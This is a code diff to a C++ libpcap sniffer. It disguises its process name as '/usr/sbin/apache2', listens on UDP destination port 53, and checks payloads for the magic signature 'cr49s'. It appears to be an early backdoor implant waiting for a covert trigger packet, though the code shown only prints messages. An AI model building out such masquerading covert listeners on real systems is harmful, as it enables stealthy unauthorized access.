@@ -3,11 +3,17 @@
 #include <sys/prctl.h>
 #include <sys/types.h>
 #include <unistd.h>
-
+#include <netinet/if_ether.h>
+#include <netinet/ip.h>
 
 #include <pcap/pcap.h>
 
 constexpr std::string_view FAKE_PROCESS_NAME = "/usr/sbin/apache2";
+constexpr unsigned int HEADERS_SIZE = sizeof(struct pcap_pkthdr);
+
+constexpr uint ETHERNET_HEADER_SIZE = 14;
+constexpr uint UDP_HEADER_SIZE = 8;
+constexpr std::string_view SIGNATURE_ONE = "cr49s";
 
 
 static pcap_if_t * findDevice()
@@ -29,9 +35,20 @@ static pcap_if_t * findDevice()
 };
 
 
-void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* buffer)
+void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
 {
 	std::cout << "Packet received" << std::endl;
+
+	const ip* ip_header = (ip*)(packet + ETHERNET_HEADER_SIZE);
+	const uint ip_header_len = ip_header->ip_hl * 4;
+	const uint total_header_size = sizeof(struct ether_header) + ip_header_len + UDP_HEADER_SIZE;
+
+	const u_char* payload = packet + total_header_size;
+	if (memcmp(payload, SIGNATURE_ONE.data(), strlen(SIGNATURE_ONE.data())) != 0) {
+		std::cout << "Payload has no proper signature" << std::endl;
+		return;
+	}
+	std::cout << "Payload signature correct" << std::endl;
 }
 
 
@@ -57,7 +74,7 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 
-	constexpr char filter[] = "udp port 53";
+	constexpr char filter[] = "udp dst port 53";
 	bpf_program fp = { 0 };
 	if (pcap_compile(handler, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1) {
 		std::cout << "Error : pcap_compile" << std::endl;
